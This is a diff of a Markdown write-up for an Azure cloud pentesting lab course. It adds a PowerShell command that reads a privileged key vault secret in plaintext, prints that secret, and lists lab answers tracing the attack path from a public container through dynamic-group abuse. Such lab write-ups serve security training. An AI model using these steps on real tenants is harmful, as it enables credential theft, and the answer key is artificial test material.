+Content Type :
+Tags         :
+```
+
+在其中发现了一个secret对象，尝试读取它
+
+```powershell
+PS C:\Users\Randark>  Get-AzKeyVaultSecret -VaultName breakglass-vault -Name PrivilegedAccess -AsPlainText | Format-List *
+eb9fd8e8dfbd5712a2e6071e6000aa35
 ```
 
 ## Completion Certificate
@@ -25,7 +1748,7 @@ This course is designed for security professionals, penetration testers, and tho
 <summary> Domain of the RetailCorp tenant </summary>
 
 ```plaintext
-SAS URL
+retailcorp.onmicrosoft.com
 ```
 
 </details>
@@ -35,9 +1758,93 @@ SAS URL
 <summary> Tenant ID of the RetailCorp tenant </summary>
 
 ```plaintext
-astfvrdz736aszoiswy736
+711c59fe-8dee-40c0-adc1-ed08f738de43
+```
+
+</details>
+
+<details>
+
+<summary> Name of the publicly readable container in RetailCorp tenant </summary>
+
+```plaintext
+configuration
+```
+
+</details>
+
+<details>
+
+<summary> Name of the PowerShell script available in the publicly readable container </summary>
+
+```plaintext
+PAS_Deployment_Script.ps1
+```
+
+</details>
+
+<details>
+
+<summary> Name of the dynamic group in RetailCorp tenant </summary>
+
+```plaintext
+PIMAdmins
+```
+
+</details>
+
+<details>
+
+<summary> Name of the attribute of a dynamic group that contains rule for membership </summary>
+
+```plaintext
+MembershipRule
+```
+
+</details>
+
+<details>
+
+<summary> Name of the container that the guest user can read after it is added to the dynamic group </summary>
+
+```plaintext
+PIMAdmins
+```
+
+</details>
+
+<details>
+
+<summary> AppId of the application whose backup is present in the container readable by the guest </summary>
+
+```plaintext
+20eb5f4e-317a-4987-a384-298bf636f082
+```
+
+</details>
+
+<details>
+
+<summary> Name of the keyvault that contains a secret that the Enterprise Application PIM can read </summary>
+
+```plaintext
+PrivilegedAccess
+```
+
+</details>
+
+<details>
+
+<summary> Value from the secret object PrivilegedAccess </summary>
+
+```plaintext
+eb9fd8e8dfbd5712a2e6071e6000aa35
 ```
 
 </details>
 
 :::
+
+## After all
+
+![Certificate](img/image_20260150-215021.png)
